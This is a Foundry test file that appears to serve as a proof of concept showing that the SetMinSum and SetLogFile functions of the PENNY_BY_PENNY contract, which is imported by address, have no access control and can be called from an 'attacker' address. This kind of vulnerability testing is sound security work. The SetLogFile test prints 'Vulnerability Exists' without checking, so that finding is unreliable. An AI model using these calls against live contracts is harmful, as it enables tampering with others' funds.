// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol";

contract PennyAccessControlTest is Test {
    PENNY_BY_PENNY public pennyContract;
    address public deployer = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        vm.deal(attacker, 1 ether);
        vm.prank(deployer);
        pennyContract = new PENNY_BY_PENNY();
    }

    function test_setMinSumWithoutAccessControl() public {
        uint256 initialMinSum = pennyContract.MinSum();
        console2.log("--- BEFORE-Trigger SetMinSum ---");
        console2.log("   Initial MinSum:", initialMinSum);
        
        console2.log("--- Trigger SetMinSum ---");
        vm.prank(attacker);
        pennyContract.SetMinSum(1000 ether);
        
        uint256 minSumAfter = pennyContract.MinSum();
        console2.log("--- AFTER-Trigger SetMinSum ---");
        console2.log("   MinSum after:", minSumAfter);
        
        if (minSumAfter == 1000 ether) {
            console2.log("Vulnerability Exists: Attacker successfully changed MinSum to 1000 ether");
        } else {
            console2.log("Vulnerability not Exist: MinSum remains unchanged by attacker");
        }
    }

    function test_setLogFileWithoutAccessControl() public {
        console2.log("--- BEFORE-Trigger SetLogFile ---");
        console2.log("   LogFile state: Not accessible");
        
        console2.log("--- Trigger SetLogFile ---");
        vm.prank(attacker);
        pennyContract.SetLogFile(attacker);
        
        console2.log("--- AFTER-Trigger SetLogFile ---");
        console2.log("   LogFile state: Not accessible (assumed changed)");
        console2.log("Vulnerability Exists: Non-owner call to SetLogFile did not revert");
    }
}